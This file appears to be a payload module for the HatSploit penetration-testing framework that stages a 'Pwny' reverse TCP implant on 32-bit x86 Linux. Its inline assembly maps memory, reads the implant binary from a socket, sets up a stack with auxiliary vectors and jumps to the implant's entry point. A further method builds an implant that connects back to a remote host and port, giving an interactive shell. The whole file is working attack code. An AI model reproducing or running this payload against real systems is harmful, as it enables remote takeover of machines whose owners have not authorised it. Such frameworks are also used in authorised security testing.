
"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import io

from pwny import Pwny
from pwny.session import PwnySession

from elftools.elf.elffile import ELFFile

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux x86 Pwny Reverse TCP",
            'Payload': "linux/x86/pwny_reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive reverse Pwny shell for Linux
                with x86 architecture.
            """,
            'Arch': ARCH_X86,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Type': REVERSE_TCP,
        })

    def stage(self):
        implant = self.implant()
        length = len(implant)
        entry = ELFFile(io.BytesIO(implant)).header['e_entry']

        return self.__asm__(
            f"""
            start:
                push edi
                xor ebx, ebx
                mov ecx, {hex(length)}
                mov edx, 0x7
                mov esi, 0x22
                xor edi, edi
                xor ebp, ebp
                mov eax, 0xc0
                int 0x80

                mov edx, eax
                pop ebx
                push 0x100
                push {hex(length)}
                push eax
                push ebx
                mov ecx, esp
                mov ebx, 0xa
                mov eax, 0x66
                int 0x80

            #################################################
            ##
            ##    +----------------------------------+ low
            ##    |              ARGC                |
            ##    |----------------------------------|
            ##    |           ARGV[0] = p            |
            ##    |----------------------------------|
            ##    |         ARGV[1] = sock           |
            ##    |----------------------------------|
            ##    |         NULL (ends ARGV)         |
            ##    |----------------------------------|
            ##    |          ENV strings             |
            ##    |----------------------------------|
            ##    |         NULL (ends ENV)          |
            ##    |----------------------------------|
            ##    |           AT_BASE (7)            |
            ##    |----------------------------------|
            ##    |   address of pwny binary image   |
            ##    |----------------------------------|
            ##    |           AT_NULL (0)            |
            ##    |----------------------------------|
            ##    |         NULL (ends AUXV)         |
            ##    +----------------------------------+ high
            ##
            #################################################

                pop edi
                xor ebx, ebx
                and esp, 0xfffffff0
                add esp, 0x28
                mov eax, 0x70
                push eax
                mov esi, esp
                push ebx
                push ebx
                push edx
                mov eax, 0x7
                push eax
                push ebx
                push ebx
                push edi
                push esi
                mov eax, 0x2
                push eax

                mov eax, {hex(entry)}
                add edx, eax
                jmp edx
            """
        )

    def implant(self):
        return Pwny(
            target='i486-linux-musl',
        ).to_binary('bin')

    def run(self):
        return Pwny(
            target='i486-linux-musl',
            options={
                'uri': f'tcp://{self.rhost.value}:{str(self.rport.value)}'
            }
        ).to_binary()
